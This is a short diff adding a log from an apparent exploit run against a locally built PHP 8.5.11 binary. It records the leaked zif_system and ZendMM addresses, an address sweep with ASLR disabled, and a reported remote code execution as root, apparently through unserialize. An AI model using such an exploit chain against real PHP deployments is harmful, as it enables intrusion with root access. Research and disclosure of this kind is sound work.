@@ -1,0 +1,16 @@
+[*] target binary: /tmp/php8511_build/out/sapi/cli/php (PHP 8.5.11)
+[+] binary base 0x555555400000  zif_system 0x5555558d9930 (+0x4d9930)
+[+] ZendMM chunk candidates: 0x7ffff7800000
+[*] chain zero5: running under /usr/bin/setarch -R (ASLR off, no gdb), address sweep
+    [zero5] try #1 chunk=0x7ffff7800000 base=0x7ffff7878000 -> rc=0
+    [zero5] try #2 chunk=0x7ffff7800000 base=0x7ffff7879000 -> rc=0
+    [zero5] try #3 chunk=0x7ffff7800000 base=0x7ffff787a000 -> rc=0
+    [zero5] try #4 chunk=0x7ffff7800000 base=0x7ffff787b000 -> rc=0
+    [zero5] try #5 chunk=0x7ffff7800000 base=0x7ffff787c000 -> rc=0
+    [zero5] try #6 chunk=0x7ffff7800000 base=0x7ffff787d000 -> rc=0
+    [zero5] try #7 chunk=0x7ffff7800000 base=0x7ffff787e000 -> rc=0
+    [zero5] try #8 chunk=0x7ffff7800000 base=0x7ffff787f000 -> rc=0
+    [zero5] try #9 chunk=0x7ffff7800000 base=0x7ffff7880000 -> HIT
+[+] === zero5: RCE === freed-block base 0x7ffff7880000
+[+] RECEIPT (command output): uid=0(root) gid=0(root) groups=0(root)
+[+] scripts kept in /tmp/pwn_unserialize_lyeouag8
